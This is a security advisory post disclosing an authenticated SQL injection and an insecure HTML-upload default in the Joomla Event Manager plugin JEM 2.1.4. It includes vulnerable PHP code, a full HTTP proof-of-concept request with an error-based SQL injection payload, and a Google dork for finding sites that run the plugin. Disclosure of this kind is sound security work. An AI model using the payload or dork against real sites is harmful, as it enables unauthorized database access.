---
title:  "Multiple vulnerabilities in Joomla Event Manager 2.1.4"
date:   2017-08-10 20:00:00
excerpt: "A couple of security issues in Joomla Event Manager plugin, JEM 2.1.4."
---

I identified some vulnerabilities and insecure settings in [Joomla Event Manager plugin, JEM 2.1.4](https://www.joomlaeventmanager.net/download?download=50:jem-2-1-4-stable){:target="_blank"}. A malicious user could use these issues to access back-end database data and attack application clients. Attacker must have valid credentials to exploit these issues.

Some websites which use this Joomla plugin can be found using the Google dork: `inurl:option=com_jem`

## SQL Injection

Authenticated user can execute arbitrary SQL queries via SQL injection in the functionality that allows to publish/unpublish an event. Vulnerable resource is *index.php?option=com_jem&view=myevents* and the injection point is *cid* parameter.

```php
// sites/models/myevents.php
function publish($cid = array(), $publish = 1)
{
    if (is_array($cid) && count($cid)) {
        $cids = implode(',', $cid);

	$query = 'UPDATE #__jem_events'
               . ' SET published = '. (int) $publish
               . ' WHERE id IN ('. $cids .')'
               . ' AND (checked_out = 0 OR (checked_out = ' .$userid. '))';

        $this->_db->setQuery($query);
    }
}
```

POC
```
POST /joomla3.4.3/index.php?option=com_jem&view=myevents&Itemid=151 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0
Cookie: 55cfbe406ffe44b0159d9a943820d207=gauuoq0rqlakkltqj4dd1mpd76; jpanesliders_stat-pane=0; jpanesliders_event-sliders-10=2; d6300469df4ad94ccc019d02bc74f647=4339lu3g2tn4lhg2lvgd8ft263
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 352

filter=1&filter_search=&limit=10&cid%5B%5D=1,2)%20AND%20(SELECT%206959%20FROM(SELECT%20COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a)%20AND%20(1577=1577&filter_order=a.dates&filter_order_Dir=&enableemailaddress=0&boxchecked=1&task=myevents.unpublish&option=com_jem&5c597c6e06b1d6627024f147b562ecaf=1
```

## Insecure File Upload

Default JEM settings allow to upload HTML/HTM files as event's attachment. An authenticated attacker could upload malicious HTML/HTM files with malicious code (e.g. Javascript). These attachments could be reachable on *<<website>>/media/com_jem/attachments/event/event[id]/* or downloaded and executed locally by the victim's browser.

Attachments process is handled by */site/classes/attachments.class.php* file.

File types allowed by default are in the */admin/sql/install.mysql.utf.sql* file.

## References

- [ExploitDB](www.exploit-db.com/exploits/37767/){:target="_blank"}

## Timeline

* 2015-08-01: Vendor notification.
* 2015-08-12: Vendor fixes the issues in the development branch.
	
The author is not responsible for the misuse of the information provided in this advisory.